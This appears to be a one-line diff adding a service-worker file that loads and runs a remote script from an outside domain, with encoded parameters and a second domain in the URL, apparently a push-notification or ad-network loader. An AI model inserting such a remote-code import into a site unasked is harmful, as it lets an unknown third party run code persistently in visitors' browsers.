@@ -1,0 +1,1 @@
+importScripts('https://tpstr.pro/v1/sw-import.js?h=waWQiOjEwMjIzNzIsInNpZCI6MTAyODIwMCwid2lkIjo0OTUwNSwic3JjIjoyLCJwbSI6MH0=eyJ&d=neswangy.xyz');
